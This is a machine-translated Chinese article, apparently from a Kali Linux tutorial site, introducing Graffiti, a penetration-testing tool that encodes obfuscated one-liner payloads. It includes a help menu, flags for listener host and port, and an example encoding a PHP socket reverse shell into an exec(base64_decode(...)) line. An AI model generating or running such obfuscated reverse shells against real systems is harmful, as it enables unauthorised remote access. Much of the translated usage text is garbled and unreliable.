# Graffiti:一个工具，用于生成模糊的 One Liners，以帮助进行渗透测试

> 原文：<https://kalilinuxtutorials.com/graffiti/>

[![Graffiti : A Tool To Generate Obfuscated One Liners To Aid In Penetration Testing](img/fbc4d72e39f52e4bd2c1a04833e6d4fa.png "Graffiti : A Tool To Generate Obfuscated One Liners To Aid In Penetration Testing")](https://3.bp.blogspot.com/-Q1MZJotjTc4/XObcEIXJPFI/AAAAAAAAAdk/AVxDVjUgNOQY6rVkgWQYTEjsC60BwRhSACLcBGAs/s1600/Penetration%2BTesting%25281%2529.png)

Graffiti 是一种工具，用于生成混淆的单行程序，以帮助进行渗透测试。Graffiti 接受以下编码语言:

*   计算机编程语言
*   Perl 语言
*   一批
*   Powershell
*   服务器端编程语言（Professional Hypertext Preprocessor 的缩写）
*   尝试

它还将接受当前不在列表中的语言，并将 oneliner 存储到数据库中。

**也可阅读-[Bandit:旨在发现 Python 代码中常见安全问题的工具](https://kalilinuxtutorials.com/bandit-security-issues/)**

**特性**

Graffiti 配备了一个数据库，可以将每个编码的有效载荷插入其中，以便最终用户可以查看已经创建的有效载荷以供将来使用。可以使用以下技术对有效载荷进行编码:

*   异或运算
*   Base64
*   十六进制
*   ROT13
*   生的

涂鸦的一些特征包括:

*   终端接入，能够运行外部命令
*   能够创建自己的有效负载 JSON 文件
*   能够查看数据库中缓存的有效负载
*   能够在内存中运行数据库以便快速删除
*   终端历史和终端历史的保存
*   终端内部的自动制表符补全
*   能够安全地擦除历史文件和数据库文件
*   多种编码技术如上所述

**用法**

Graffiti 有一个内置的终端，当你没有给程序传递标志时，它会自动进入终端。终端拥有历史记录、运行外部命令的能力以及自己的内部命令。为了获得帮助，你必须键入`help`或`?`:

```
no arguments have been passed, dropping into terminal type `help/?` to get help, all commands that sit inside of `/bin` are available in the terminal
root@graffiti:~/graffiti# ?

 Command                                  Description
---------                                --------------
 help/?                                  Show this help
 external                                List available external commands
 cached                                  Display all payloads that are already in the database
 list/show                               List all available payloads
 search <phrase>                         Search for a specific payload
 use <payload> <coder>                   Use this payload and encode it using a specified coder
 info <payload>                          Get information on a specified payload
 check                                   Check for updates
 history                                 Display command history
 exit/quit                               Exit the terminal and running session
 encode <script-type> <coder>            Encode a provided payload

root@graffiti:~/graffiti# help

 Command                                  Description
---------                                --------------
 help/?                                  Show this help
 external                                List available external commands
 cached                                  Display all payloads that are already in the database
 list/show                               List all available payloads
 search <phrase>                         Search for a specific payload
 use <payload> <coder>                   Use this payload and encode it using a specified coder
 info <payload>                          Get information on a specified payload
 check                                   Check for updates
 history                                 Display command history
 exit/quit                               Exit the terminal and running session
 encode <script-type> <coder>            Encode a provided payload

```

Graffiti 还提供了命令行参数，当您需要快速编码有效载荷时:

**用法:graffiti . py[-H][-c CODEC][-P PAYLOAD]
[–创建有效载荷脚本类型有效载荷类型描述 OS]
[-l]
[-P[有效载荷[脚本类型，有效载荷类型，描述…]]]
[-lH 监听地址] [-lP 监听端口][-u URL][-vC]
[-H][-W][–内存] [-mC 命令[命令…]]

可选参数:【参数 –PAYLOAD PAYLOAD 传递要使用的有效负载的路径(****default = None)
–创建有效负载脚本类型有效负载类型描述 OS
创建有效负载文件并将其存储在
中。 /etc/payloads(*****default = None)-l，–list 按路径列出所有可用的有效负载(*****default = False)
-P[PAYLOAD[SCRIPT-TYPE，PAYLOAD-TYPE，DESCRIPTION …]]，–personal-PAYLOAD[PAYLOAD[SCRIPT-TYPE，PAYLOAD-TYPE，DESCRIPTION…]]]
传递您自己的个人有效负载以用于编码
(*****default = None)-lH listing-ADDRESS，–lhost listing –lport LISTENING-PORT
传递一个监听端口以用于有效负载(如果
需要的话)(** ***默认=无)-u URL，–URL URL 如果有效负载需要的话传递一个 URL(*****默认=无)
-vC，–view-cached 查看已经存在于
数据库中的缓存数据
-H，–no-history 不存储命令历史记录(** ***默认=True –wipe 擦除数据库和历史(*** **默认= False)
–memory 将数据库初始化成内存而不是. db
文件(** ***默认= False)–mC COMMAND【COMMAND…】,–more-commands COMMAND【COMMAND…】传递更多的外部命令，这将允许它们被访问终端内部的命令必须在你的路径中(*** **默认=None)***

对有效载荷进行编码很简单，如下所示:

**根@涂鸦:~/graffiti# python 涂鸦. py-c base 64-p/Linux/PHP/socket _ reverse . JSON-lh127 . 0 . 0 . 1-LP 9065
委托有效负载:
PHP-r ' exec(base 64 _ decode(" jhnvy 2s 9 znvy 2 tvcgvukcixmj cuc 4 wljeilkwnjupo**

**安装**

在任何 Linux、Mac 或 Windows 系统上，Graffiti 都应该开箱即用，不需要安装任何外部软件包。如果您想将 Graffiti 作为可执行文件安装到您的系统上(您必须运行 Linux 或 Mac 才能成功运行)，您只需做以下事情:

**。/install.sh**

这将安装涂鸦到您的系统，并允许您从任何地方运行它。

**演示**

[https://player.vimeo.com/video/303548362?dnt=1&app_id=122963](https://player.vimeo.com/video/303548362?dnt=1&app_id=122963)

[**Download**](https://github.com/Ekultek/Graffiti)